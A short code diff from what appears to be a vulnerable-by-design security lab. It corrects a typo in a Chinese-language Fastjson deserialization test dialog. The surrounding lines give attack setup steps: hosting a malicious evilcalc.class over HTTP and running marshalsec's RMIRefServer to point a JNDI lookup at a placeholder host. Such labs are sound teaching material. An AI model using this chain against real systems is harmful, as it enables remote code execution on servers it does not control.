@@ -153,7 +153,7 @@ public String safe1(@RequestBody String content) {
         <!-- 打开嵌套表格的对话框1 -->
         <el-dialog title="Fastjson反序列化测试" :visible.sync="dialogFormVisible1" class="center-dialog">
             <div style="text-align: left; color: red; font-style: italic;">
-                注意，需要提前先完成下面两部准备工作：<br>
+                注意，需要提前先完成下面两步准备工作：<br>
                 1、将 evilcalc.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
                 2、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
                 "http://xx.xx.xx.xx:8088/#evilcalc" 9999）
